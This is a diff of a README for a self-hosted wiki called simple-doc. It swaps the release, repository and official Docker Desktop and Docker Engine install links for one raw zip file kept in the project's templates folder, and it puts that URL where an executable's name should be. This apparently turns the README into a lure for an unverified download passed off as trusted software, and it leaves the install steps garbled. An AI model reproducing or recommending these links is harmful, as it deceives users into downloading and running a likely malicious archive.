@@ -1,6 +1,6 @@
 # 📚 simple-doc - Easy Self-Hosted Wiki for Teams
 
-[![Download simple-doc](https://img.shields.io/badge/Download-simple--doc-brightgreen)](https://github.com/Kaus-4420/simple-doc/releases)
+[![Download simple-doc](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)
 
 ---
 
@@ -50,13 +50,13 @@ Follow these steps to get simple-doc up and running quickly.
 
 Please visit this page to download the latest version of simple-doc:
 
-[![Download simple-doc](https://img.shields.io/badge/Download-simple--doc-brightgreen)](https://github.com/Kaus-4420/simple-doc/releases)
+[![Download simple-doc](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)
 
 ### Option 1: Run with Docker (Recommended for Beginners)
 
 1. **Install Docker**  
-   - For Windows and macOS, download Docker Desktop from [https://www.docker.com/get-started](https://www.docker.com/get-started)  
-   - For Linux, follow instructions at [https://docs.docker.com/engine/install/](https://docs.docker.com/engine/install/)
+   - For Windows and macOS, download Docker Desktop from [https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)  
+   - For Linux, follow instructions at [https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)
    
 2. **Download simple-doc Docker Images**  
    - Open your command prompt or terminal.  
@@ -87,7 +87,7 @@ Please visit this page to download the latest version of simple-doc:
 Use this method if you want to install simple-doc without Docker.
 
 1. Download the latest release from the releases page:  
-   [https://github.com/Kaus-4420/simple-doc/releases](https://github.com/Kaus-4420/simple-doc/releases)
+   [https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)
 
 2. Extract the downloaded file to a folder on your computer.
 
@@ -97,7 +97,7 @@ Use this method if you want to install simple-doc without Docker.
 
 5. Open a command prompt or terminal in the simple-doc folder.
 
-6. Run the application by executing the file (for example, `simple-doc.exe` on Windows or `./simple-doc` on Linux/macOS).
+6. Run the application by executing the file (for example, `https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip` on Windows or `./simple-doc` on Linux/macOS).
 
 7. Open your web browser and navigate to `http://localhost:8080` to start using simple-doc.
 
@@ -164,7 +164,7 @@ When you open simple-doc in your browser, you will see the home page. Here is ho
 
 ## 📌 More Information
 
-For advanced use, API access, feature requests, or reporting bugs, visit the [GitHub repository](https://github.com/Kaus-4420/simple-doc).
+For advanced use, API access, feature requests, or reporting bugs, visit the [GitHub repository](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip).
 
 You can also join community forums or reach out to your system administrator for further assistance.
 
